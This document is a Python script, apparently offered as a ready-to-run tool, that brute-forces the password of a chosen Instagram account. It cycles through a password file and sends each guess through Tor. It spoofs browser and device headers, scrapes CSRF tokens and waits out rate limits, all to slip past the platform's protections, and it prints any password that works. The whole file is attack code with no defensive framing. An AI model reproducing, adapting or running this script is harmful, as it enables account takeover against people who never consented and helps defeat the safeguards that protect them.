import requests
import random
import time
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
import hashlib

class InstagramAdvancedBrute:
    def __init__(self, username, password_file):
        self.username = username
        self.passwords = open(password_file).read().splitlines()
        self.session = requests.Session()
        self.ua = UserAgent()
        self.tor_socks = ('socks5h', 'localhost', 9050)
        self.login_attempts = 0
        self.successful_logins = 0
        self.failed_logins = 0
        
    def _get_random_headers(self):
        # Use diverse browser fingerprints
        headers = {
            'User-Agent': self.ua.random,
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en;q=0.8']),
            'Referer': 'https://www.instagram.com/accounts/login/',
            'X-Requested-With': 'XMLHttpRequest',
            'X-IG-App-ID': str(random.randint(100000000000000, 999999999999999)),
            'X-IG-Device-ID': hashlib.md5(str(random.random()).encode()).hexdigest(),
            'X-IG-Timezone': str(random.randint(-18000, 18000)),
            'X-IG-Connection-Type': random.choice(['WIFI', 'CELLULAR']),
            'X-IG-Bandwidth-Speed-KBPS': str(random.uniform(1000, 5000)),
            'X-IG-Bandwidth-TotalTime-MS': str(random.randint(1000, 5000)),
            'X-IG-Bandwidth-TotalBytes-MS': str(random.randint(100000, 500000))
        }
        return headers
    
    def _tor_request(self, url, method='POST', data=None):
        # Use multiple Tor circuits
        for _ in range(3):  # Try 3 times with fresh circuits
            try:
                proxies = {
                    'http': f'socks5://{self.tor_socks[1]}:{self.tor_socks[2]}',
                    'https': f'socks5://{self.tor_socks[1]}:{self.tor_socks[2]}'
                }
                
                headers = self._get_random_headers()
                response = self.session.request(method, url, headers=headers, 
                                              data=data, proxies=proxies, timeout=10)
                
                if response.status_code == 200:
                    return response
            except:
                continue
            
        return None
    
    def _check_security_response(self, response):
        # Check for security indicators
        if 'Please wait a few minutes before you try again.' in response.text:
            print("[!] Rate limit hit. Waiting...")
            time.sleep(300)  # 5 minute delay
            return False
        
        if 'checkpoint_required' in response.text:
            print("[!] Checkpoint required. Manual intervention needed.")
            return False
            
        return True
    
    def brute_force(self):
        for i in range(0, len(self.passwords), 10):
            batch = self.passwords[i:i+10]
            for password in batch:
                try:
                    self.login_attempts += 1
                    
                    # Get CSRF token first
                    login_page = self._tor_request('https://www.instagram.com/accounts/login/')
                    if not login_page:
                        continue
                    
                    csrf_token = None
                    soup = BeautifulSoup(login_page.text, 'html.parser')
                    for script in soup.find_all('script'):
                        if 'csrf_token' in script.text:
                            csrf_token = script.text.split('"csrf_token":"')[1].split('"')[0]
                            break
                    
                    if not csrf_token:
                        continue
                    
                    # Prepare request with security tokens
                    data = {
                        'username': self.username,
                        'password': password,
                        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                        'queryParams': '{}',
                        'optIntoOneTap': 'false',
                        'source': 'auth_switcher',
                        'csrfmiddlewaretoken': csrf_token
                    }
                    
                    response = self._tor_request(
                        'https://www.instagram.com/accounts/login/ajax/',
                        data=data
                    )
                    
                    if not response or not self._check_security_response(response):
                        continue
                    
                    # Check for success
                    if '"authenticated":true' in response.text:
                        self.successful_logins += 1
                        print(f"[+] SUCCESS! Password: {password}")
                        return password
                    else:
                        self.failed_logins += 1
                        print(f"[-] Failed: {password}")
                
                except Exception as e:
                    print(f"[!] Error: {str(e)}")
                    continue
                
                # Randomized delays
                time.sleep(random.uniform(2, 8))
            
            # Circuit rotation between batches
            print(f"[+] Completed batch. Current stats: {self.login_attempts} attempts, "
                  f"{self.successful_logins} successes, {self.failed_logins} failures")
        
        print("[!] Password not found")
        return None

if __name__ == "__main__":
    username = input("Enter Instagram username: ")
    password_file = input("Enter path to password file: ")
    brute = InstagramAdvancedBrute(username, password_file)
    brute.brute_force()